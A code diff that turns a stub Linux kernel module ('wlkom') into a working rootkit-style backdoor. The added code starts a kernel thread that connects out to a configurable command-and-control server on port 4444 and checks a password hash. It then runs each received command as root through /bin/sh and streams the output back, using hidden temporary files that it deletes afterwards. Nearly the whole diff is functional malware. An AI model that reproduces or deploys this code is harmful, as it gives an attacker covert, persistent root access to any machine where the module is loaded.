@@ -1,17 +1,284 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/kthread.h>
+#include <linux/net.h>
+#include <linux/inet.h>
+#include <linux/fs.h>
+#include <net/sock.h>
 
+#define RETRY_DELAY 5
+#define AUTH_PREFIX "AUTH "
+#define AUTH_PREFIX_LEN (sizeof(AUTH_PREFIX) - 1)
+#define TMP_OUT_FILE "/tmp/.wlkom_out"
+#define TMP_ERR_FILE "/tmp/.wlkom_err"
+
+static char *password_hash = "";
+static char *c2_ip    = "192.168.100.10";
+static int   c2_port  = 4444;
+module_param(password_hash, charp, 0400);
+module_param(c2_ip,    charp, 0400);
+module_param(c2_port,  int,   0400);
+MODULE_PARM_DESC(password_hash, "FNV-1a password hash (required at insmod)");
+MODULE_PARM_DESC(c2_ip,    "C2 server IPv4 address");
+MODULE_PARM_DESC(c2_port,  "C2 server TCP port");
+
+static struct task_struct *conn_thread = NULL;
+static struct socket      *conn_sock   = NULL;
+
+static void *to_sockaddr(void *ptr) { return ptr; }
+
+static int recv_line(char *buf, size_t size)
+{
+    size_t pos = 0;
+    int ret;
+
+    if (size == 0)
+        return -EINVAL;
+
+    while (pos + 1 < size && !kthread_should_stop()) {
+        struct msghdr msg = { 0 };
+        struct kvec vec = {
+            .iov_base = &buf[pos],
+            .iov_len = 1,
+        };
+
+        ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, 1, 0);
+        if (ret <= 0)
+            return ret;
+
+        if (buf[pos] == '\n') {
+            buf[pos] = '\0';
+            if (pos > 0 && buf[pos - 1] == '\r')
+                buf[pos - 1] = '\0';
+            return pos;
+        }
+
+        pos++;
+    }
+
+    buf[pos] = '\0';
+    return -EMSGSIZE;
+}
+
+static int send_reply(const char *reply)
+{
+    struct msghdr msg = { 0 };
+    struct kvec vec = {
+        .iov_base = (void *)reply,
+        .iov_len = strlen(reply),
+    };
+
+    return kernel_sendmsg(conn_sock, &msg, &vec, 1, vec.iov_len);
+}
+
+
+static void execute_and_send_output(char *cmd)
+{
+    char *cmd_redirect;
+    char *file_buf;
+    char status_header[128];
+    struct file *file;
+    loff_t pos = 0;
+    ssize_t bytes_read;
+    int exit_status;
+
+    cmd_redirect = kmalloc(4096, GFP_KERNEL);
+    if (!cmd_redirect) {
+        send_reply("[Rootkit Error]: kmalloc cmd_redirect failed.\n\n");
+        return;
+    }
+    file_buf = kmalloc(4096, GFP_KERNEL);
+    if (!file_buf) {
+        send_reply("[Rootkit Error]: kmalloc file_buf failed.\n\n");
+        kfree(cmd_redirect);
+        return;
+    }
+
+    snprintf(cmd_redirect, 4096, "(%s) > " TMP_OUT_FILE " 2>" TMP_ERR_FILE, cmd);
+
+    char *argv[] = { "/bin/sh", "-c", cmd_redirect, NULL };
+    static char *envp[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+        NULL
+    };
+
+    
+    exit_status = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    int real_exit_code = (exit_status >> 8) & 0xFF;
+    
+    
+    snprintf(status_header, sizeof(status_header), "[Exit Status: %d]\n", real_exit_code);
+    send_reply(status_header);
+
+    send_reply("--- STDOUT ---\n");
+    file = filp_open(TMP_OUT_FILE, O_RDONLY, 0);
+    if (!IS_ERR(file)) {
+        while ((bytes_read = kernel_read(file, file_buf, 4095, &pos)) > 0) {
+            file_buf[bytes_read] = '\0';
+            send_reply(file_buf);
+        }
+        filp_close(file, NULL);
+    }
+
+    pos = 0;
+    send_reply("--- STDERR ---\n");
+    file = filp_open(TMP_ERR_FILE, O_RDONLY, 0);
+    if (!IS_ERR(file)) {
+        while ((bytes_read = kernel_read(file, file_buf, 4095, &pos)) > 0) {
+            file_buf[bytes_read] = '\0';
+            send_reply(file_buf);
+        }
+        filp_close(file, NULL);
+    }
+
+    send_reply("--- End of Output ---\n\n");
+
+    {
+        char *rm_out[] = { "/bin/rm", "-f", TMP_OUT_FILE, NULL };
+        char *rm_err[] = { "/bin/rm", "-f", TMP_ERR_FILE, NULL };
+        call_usermodehelper(rm_out[0], rm_out, envp, UMH_WAIT_PROC);
+        call_usermodehelper(rm_err[0], rm_err, envp, UMH_WAIT_PROC);
+    }
+    kfree(file_buf);
+    kfree(cmd_redirect);
+}
+
+static int authenticate_c2(void)
+{
+    char buf[256];
+    char *received_hash;
+    int ret;
+
+    memset(buf, 0, sizeof(buf));
+    ret = recv_line(buf, sizeof(buf));
+    if (ret <= 0)
+        return ret ? ret : -ECONNRESET;
+
+    if (strncmp(buf, AUTH_PREFIX, AUTH_PREFIX_LEN) != 0)
+        return -EACCES;
+
+    received_hash = buf + AUTH_PREFIX_LEN;
+    if (strcmp(received_hash, password_hash) != 0)
+        return -EACCES;
+
+    return 0;
+}
+
+static int do_connect(void)
+{
+    struct sockaddr_in addr = { 0 };
+    unsigned char ip_bin[4] = { 0 };
+    int ret;
+
+    if (in4_pton(c2_ip, -1, ip_bin, -1, NULL) == 0) {
+        pr_err("wlkom: invalid C2 IP address: %s\n", c2_ip);
+        return -EINVAL;
+    }
+
+    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
+    if (ret < 0) {
+        pr_err("wlkom: sock_create failed: %d\n", ret);
+        return ret;
+    }
+
+    addr.sin_family = AF_INET;
+    addr.sin_port   = htons(c2_port);
+    memcpy(&addr.sin_addr.s_addr, ip_bin, sizeof(addr.sin_addr.s_addr));
+
+    ret = conn_sock->ops->connect(conn_sock, to_sockaddr(&addr),
+                                  sizeof(addr), 0);
+    if (ret < 0) {
+        sock_release(conn_sock);
+        conn_sock = NULL;
+        return ret;
+    }
+
+    return 0;
+}
+
+static int connection_thread(void *data)
+{
+    char buf[256];
+    int  ret;
+
+    while (!kthread_should_stop()) {
+        ret = do_connect();
+        if (ret < 0) {
+            pr_err("wlkom: C2 unreachable (%d), retry in %ds\n",
+                   ret, RETRY_DELAY);
+            schedule_timeout_interruptible(HZ * RETRY_DELAY);
+            continue;
+        }
+
+        pr_info("wlkom: connected to C2 %s:%d\n", c2_ip, c2_port);
+
+        ret = authenticate_c2();
+        if (ret < 0) {
+            pr_warn("wlkom: C2 authentication failed (%d)\n", ret);
+            goto disconnect;
+        }
+
+        pr_info("wlkom: C2 authenticated\n");
+
+        while (!kthread_should_stop()) {
+            memset(buf, 0, sizeof(buf));
+            ret = recv_line(buf, sizeof(buf));
+            if (ret <= 0)
+                break;
+
+            if (strlen(buf) == 0)
+                continue;
+
+            /* Handle processing, capturing and network streaming internally */
+            execute_and_send_output(buf);
+        }
+
+disconnect:
+        kernel_sock_shutdown(conn_sock, SHUT_RDWR);
+        sock_release(conn_sock);
+        conn_sock = NULL;
+        pr_info("wlkom: disconnected from C2, retrying\n");
+    }
+
+    return 0;
+}
 
 static int __init wlkom_init(void)
 {
-    printk(KERN_INFO "wlkom: loaded\n");
+    if (!password_hash || password_hash[0] == '\0') {
+        pr_err("wlkom: password_hash required (insmod wlkom.ko password_hash=...)\n");
+        return -EINVAL;
+    }
+
+    pr_info("wlkom: loaded\n");
+
+    conn_thread = kthread_run(connection_thread, NULL, "wlkom_conn");
+    if (IS_ERR(conn_thread)) {
+        pr_err("wlkom: failed to create connection thread\n");
+        conn_thread = NULL;
+        return -ENOMEM;
+    }
+
     return 0;
 }
 
 static void __exit wlkom_exit(void)
 {
-    printk(KERN_INFO "wlkom: unloaded\n");
+    if (conn_sock)
+        kernel_sock_shutdown(conn_sock, SHUT_RDWR);
+
+    if (conn_thread)
+        kthread_stop(conn_thread);
+
+    if (conn_sock) {
+        sock_release(conn_sock);
+        conn_sock = NULL;
+    }
+
+    pr_info("wlkom: unloaded\n");
 }
 
 module_init(wlkom_init);
